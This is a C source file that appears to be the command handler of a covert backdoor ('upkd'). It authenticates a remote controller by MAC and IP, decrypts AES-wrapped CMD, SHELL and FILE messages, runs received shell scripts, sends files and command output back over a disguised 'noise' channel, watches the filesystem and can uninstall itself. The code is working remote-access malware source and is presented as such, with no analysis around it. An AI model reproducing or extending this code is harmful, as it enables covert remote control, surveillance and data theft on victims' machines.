#include <unistd.h>
#include <string.h>

#include "../../include/upkd/commands/file_transfer_commands.h"
#include "../../include/upkd/commands/fs_monitor_commands.h"
#include "../../include/upkd/commands/system_commands.h"
#include "../../include/data_noise/data_noise.h"
#include "../../include/crypto/crypto.h"
#include "../../include/upkd/auth.h"
#include "../../include/upkd/db.h"
#include "../../include/upkd/upkd.h"

// Static function prototypes

/**
 * Finds the open tag in the provided data.
 *
 * @param data The data to search for the open tag.
 * @return A pointer to the open tag string, or NULL if not found.
 */
static char *find_open_tag(char *data);

/**
 * Finds the close tag in the provided data.
 *
 * @param data The data to search for the close tag.
 * @return A pointer to the close tag string, or NULL if not found.
 */
static char *find_close_tag(char *data);

/**
 * Decodes the provided data.
 *
 * @param data The data to decode.
 * @return A pointer to the decoded data, or NULL if an error occurs.
 */
static char* decode_data(const char *data);

/**
 * Decrypts the provided data.
 *
 * @param data The data to decrypt.
 * @return A pointer to the decrypted data, or NULL if an error occurs.
 */
static char *decrypt_data(const char *data);

/**
 * Processes a command.
 *
 * @param command The command to be processed.
 */
static void process_command(char *command);

/**
 * Processes a shell script.
 *
 * @param script The shell script to process.
 */
static void process_shell_script(const char *script);

/**
 * Processes file data.
 *
 * @param fileData The file data to process.
 */
static void process_file_data(const char *fileData);

// Public functions

void process_received_data(const char *receivedData, const char *mac_src, const char *ip_src) {

    // Decode the received data
    char *decodedData = decode_data(receivedData);
    if (decodedData == NULL) {
        fprintf(stderr, "Data decoding failed.\n");
        return; // Handle decoding failure
    }

    // If a machine with MAC address is not authenticated and the received data is an authentication code
    if (!is_authenticated() && is_auth_code(decodedData)) {

        // Authenticate the machine
        authenticate(mac_src, ip_src);
        sleep(3); // Sleep for 3 seconds

        // Send noise message
        char *message = "\nConnection established\n";
        send_noise(message, strlen(message)); // Send noise message

        printf("%s", message);
        fflush(stdout);

        // Clear the hash table
        clear_hash_table();

    } else {

        // Find open openTag
        char *openTag = find_open_tag(decodedData);
        if (openTag == NULL) {
            free(openTag);
            return;
        }

        char *closeTag = find_close_tag(decodedData);
        if (closeTag == NULL) {
            printf(" . ");
            fflush(stdout);

            free(closeTag);
            return;
        }

        // Both the open and close tags found. Check if they match
        if (strcmp(openTag, closeTag) != 0) {
            printf("\nOpen and close tags do not match: %s, %s\n", openTag, closeTag);
            fflush(stdout);

            free(openTag);
            free(closeTag);
            return;
        }

        // Retrieve the data between the tags
        printf("\nRetrieving data between tags %s...\n", openTag);
        fflush(stdout);
        char *data = decodedData + strlen(openTag) + 3; // Skip the open tag including < and />

        // Decrypt the data
        char *decryptedData = decrypt_data(data);

        // Clear hash table
        clear_hash_table();

        // Process the data based on the openTag
        if (strcmp(openTag, "CMD") == 0) {
            process_command(decryptedData);
        } else if (strcmp(openTag, "SHELL") == 0) {
            process_shell_script(decryptedData);
        } else if (strcmp(openTag, "FILE") == 0) {
            printf("Processing file data\n");

            process_file_data(decryptedData);

            printf("File data processed\n");
        } else {
            printf("Unknown openTag: %s\n", openTag);
            fflush(stdout);
        }

    }

    free(decodedData); // Free the allocated memory
}

// Static functions

static char *find_open_tag(char *data) {

    // Loop through the data to find open tag between < and />
    char *start = strchr(data, '<');
    if (start == NULL) {
        return NULL;
    }

    char *end = strstr(start, "/>");
    if (end == NULL) {
        return NULL;
    }

    // Calculate the length of the tag between < and />
    size_t tagLength = end - start - 1;

    // Allocate memory for the tag
    char *tag = (char *)malloc(tagLength + 1);
    if (tag == NULL) {
        return NULL;
    }

    // Copy the tag to the tag buffer
    strncpy(tag, start + 1, tagLength);
    tag[tagLength] = '\0';

    return tag;
}

static char *find_close_tag(char *data) {

    // Loop through the data to find open tag between </ and >
    char *start = strstr(data, "</");
    if (start == NULL) {
        return NULL;
    }

    char *end = strchr(start, '>');
    if (end == NULL) {
        return NULL;
    }

    // Calculate the length of the tag between < and />
    size_t tagLength = end - start - 2;

    // Allocate memory for the tag
    char *tag = (char *)malloc(tagLength + 1);
    if (tag == NULL) {
        return NULL;
    }

    // Copy the tag to the tag buffer
    strncpy(tag, start + 2, tagLength);
    tag[tagLength] = '\0';

    return tag;
}

static char* decode_data(const char *data) {
    // Allocate memory for the decoded data
    char *decodedData = (char *)malloc(MAX_DATA_LENGTH / 2 + 1);
    if (decodedData == NULL) {
        // Handle memory allocation failure
        return NULL;
    }

    // Loop through the received data
    const char *ptr = data;
    size_t converted_index = 0;
    while (*ptr && converted_index < MAX_DATA_LENGTH / 2) {
        // Convert current character to unsigned char
        unsigned char byte = (unsigned char)*ptr;

        // Append the character to the buffer
        decodedData[converted_index++] = (char)byte;

        // Move to the next character
        ptr++;
    }

    // Null-terminate the decoded data string
    decodedData[converted_index] = '\0';

    return decodedData;
}

static char *decrypt_data(const char *data) {

    // Calculate the number of blocks
    size_t commandLength = strlen(data);
    size_t numberOfEncryptedBlocks = commandLength / AES_BLOCK_SIZE;

    // Allocate memory for the decrypted data
    char *decryptedData = malloc(numberOfEncryptedBlocks * DECRYPTED_BLOCK_SIZE + 1);
    if (decryptedData == NULL) {
        fprintf(stderr, "Memory allocation failed.\n");
        return NULL;
    }

    // Loop through the blocks
    for (size_t i = 0; i < numberOfEncryptedBlocks; ++i) {

        // Decrypt the block
        char decryptedBlock[DECRYPTED_BLOCK_SIZE];

        aes_cbc_decrypt(data + i * AES_BLOCK_SIZE, decryptedBlock, AES_BLOCK_SIZE);

        // Copy decrypted block to the final decryptedCommand
        memcpy(decryptedData + i * DECRYPTED_BLOCK_SIZE, decryptedBlock, DECRYPTED_BLOCK_SIZE);
    }

    // Null-terminate the decryptedCommand
    decryptedData[numberOfEncryptedBlocks * DECRYPTED_BLOCK_SIZE] = '\0';

    return decryptedData;
}

static void process_command(char *command) {
    if (command == NULL) {
        return;
    }

    printf("Processing command: %s\n", command);
    fflush(stdout);

    if (strncmp(command, "download", 8) == 0) {
        char *message = "Download request received\n";
        printf("%s", message);
        fflush(stdout);

        send_file(command + 9);

    } else if (strncmp(command, "watch-fs", 8) == 0) {
        char *message = "\nWatch FS...\n";
        printf("%s", message);
        fflush(stdout);

        watch_fs(command + 9);

        send_noise(message, strlen(message));
    } else if (strcmp(command, "uninstall") == 0) {
        char *message = "\nUninstalling...\n";
        printf("%s", message);
        fflush(stdout);

        uninstall();

        send_noise(message, strlen(message));

    } else if (strcmp(command, "disconnect") == 0) {
        char *message = "\nDisconnecting...\n";
        printf("%s", message);
        fflush(stdout);

        deAuthenticate();

        send_noise(message, strlen(message));

        char *message2 = "\nDisconnected\n";
        printf("%s", message2);
        fflush(stdout);

        send_noise(message2, strlen(message2));
    } else {
        printf("Unknown command: %s\n", command);
        fflush(stdout);
    }

    free(command);

    printf("Command processed\n");
    fflush(stdout);
}

static void process_shell_script(const char *script) {
    // Send noise message
    char *message = "\nShell script received ...\n";
    printf("%s", message);
    fflush(stdout);
    send_noise(message, strlen(message));

    // Execute the shell script
    char *output = execute_shell_script(script);
    send_noise(output, strlen(output));
}

static void process_file_data(const char *fileData) {
    // Send noise message 1
    char *message1 = "\nReceiving file data ...\n";
    printf("%s", message1);
    fflush(stdout);
    send_noise(message1, strlen(message1));

    // Process the received file data
    process_received_file(fileData);

    // Send noise message 2
    char *message2 = "\nSuccessfully received file data\n";
    printf("%s", message2);
    fflush(stdout);
    send_noise(message2, strlen(message2));
}

